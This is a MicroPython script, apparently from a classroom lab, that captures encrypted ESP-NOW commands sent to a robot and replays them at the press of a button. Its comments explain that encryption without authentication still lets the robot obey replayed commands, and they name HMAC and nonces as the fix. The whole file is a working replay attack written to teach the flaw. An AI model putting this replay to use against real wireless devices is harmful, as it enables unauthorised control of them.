# espiao_cripto.py - Espiao contra o trafego CIFRADO (controle_cripto.py / robo_cripto.py).
# M5StickC PlusSE com tela, SEM terminal. NAO tem a chave: nao consegue LER o comando.
#
# O que ele mostra:
#   captura  -> aparece na tela a CIFRA em hex (bytes embaralhados): confidencialidade OK,
#               o espiao nao sabe se foi FRENTE ou TRAS.
#   replay   -> aperta A e reenvia a MESMA cifra capturada; o robo decifra e OBEDECE.
#               Sem a chave, so repetindo os bytes. Autenticidade quebrada apesar da cifra.
#
# Essa e a licao desta versao: cifrar da confidencialidade, nao autenticidade.
#
# ATENCAO: o controle_cripto.py envia em UNICAST para o robo. Um espiao ESP-NOW
# comum como este NAO recebe unicast alheio: contra ele a tela fica em "ouvindo".
# Para capturar e repetir a cifra use o sniffer em modo monitor
# (arduino/espiao_monitor_xiao_cif). Este espiao so captura cifra enviada em broadcast.
# A defesa (proxima versao) e HMAC + numero de sequencia/nonce.
#
# Grave na placa M5 como main.py (depende da pasta m5/ que ja esta na placa):
#   mpremote connect <porta-espiao> fs cp micropython/espiao/espiao_cripto.py :main.py
#
# CONTROLES (na propria placa):
#   Botao A (frente, GPIO37) -> REPLAY da cifra selecionada (o [>] na tela)
#   Botao B (lateral, GPIO39)-> move a selecao pelo historico

import network
import espnow
import time
from machine import Pin
from m5 import m5_display

CANAL = 1                 # mesmo canal de todas as placas
BROADCAST = b'\xff' * 6
HIST_MAX = 8              # quantas cifras capturadas a tela guarda

# ---------- Radio ESP-NOW ----------
def mac_str(b):
    return ':'.join('%02x' % x for x in b)

sta = network.WLAN(network.STA_IF)
sta.active(True)
sta.disconnect()
sta.config(channel=CANAL)
sta.config(pm=sta.PM_NONE)

e = espnow.ESPNow()
e.config(rxbuf=2048)
e.active(True)
e.add_peer(BROADCAST)         # precisa para poder ENVIAR (replay)

# ---------- Tela ----------
W = m5_display.WHITE
B = m5_display.BLACK
AMBAR = 0xFD20
VERDE = 0x07E0

display = m5_display.Display()

# ---------- Botoes (ativos em nivel baixo) ----------
btn_a = Pin(37, Pin.IN)       # frente -> replay
btn_b = Pin(39, Pin.IN)       # lateral -> move a selecao

def pressed(pin):
    return pin.value() == 0

# ---------- Estado ----------
historico = []                # ultimas CIFRAS capturadas (bytes crus)
total = 0
sel = 0
msg_rodape = "A=replay B=sel"
rodape_cor = W

def hexcurto(b, n=4):
    # Mostra os primeiros n bytes da cifra em hex. O espiao NAO sabe o que significam.
    return ''.join('%02x' % x for x in b[:n])

def desenhar():
    display.fill(B)
    display.draw_text_centered(2, 'SPY', AMBAR, B, scale=2)
    display.draw_text_centered(26, 'encrypted', W, B)
    display.draw_text_centered(40, 'cap: %d' % total, W, B)

    if not historico:
        display.draw_text_centered(90, 'listening', W, B)
        display.draw_text_centered(112, '...', W, B)
    else:
        # Ultima cifra, grande: bytes embaralhados, ilegiveis.
        display.draw_text_centered(60, hexcurto(historico[-1]), AMBAR, B, scale=2)

        y = 92
        for i, c in enumerate(historico):
            marca = '>' if i == sel else ' '
            linha = '%s %s' % (marca, hexcurto(c, 5))
            cor = VERDE if i == sel else W
            display.draw_text(2, y, linha[:13], cor, B)
            y += 14

    display.draw_text_centered(224, msg_rodape, rodape_cor, B)

def registrar(cifra):
    global total, sel
    total += 1
    historico.append(cifra)
    if len(historico) > HIST_MAX:
        historico.pop(0)
    sel = len(historico) - 1

def enviar_replay():
    global msg_rodape, rodape_cor
    if not historico:
        return
    cifra = historico[sel]
    e.send(BROADCAST, cifra)          # reenvia os MESMOS bytes: sem chave, so repetindo
    msg_rodape = "REPLAY cipher"
    rodape_cor = VERDE

def mover_selecao():
    global sel, msg_rodape, rodape_cor
    if not historico:
        return
    sel = (sel + 1) % len(historico)
    msg_rodape = "A=replay B=sel"
    rodape_cor = W

# ---------- Laco principal ----------
desenhar()
last_a, last_b = pressed(btn_a), pressed(btn_b)

while True:
    mudou = False

    host, msg = e.recv(0)
    if msg is not None:
        registrar(bytes(msg))         # guarda a cifra crua, sem tentar decodificar
        mudou = True

    a, b = pressed(btn_a), pressed(btn_b)
    if a and not last_a:
        enviar_replay()
        mudou = True
    if b and not last_b:
        mover_selecao()
        mudou = True
    last_a, last_b = a, b

    if mudou:
        desenhar()

    time.sleep_ms(15)
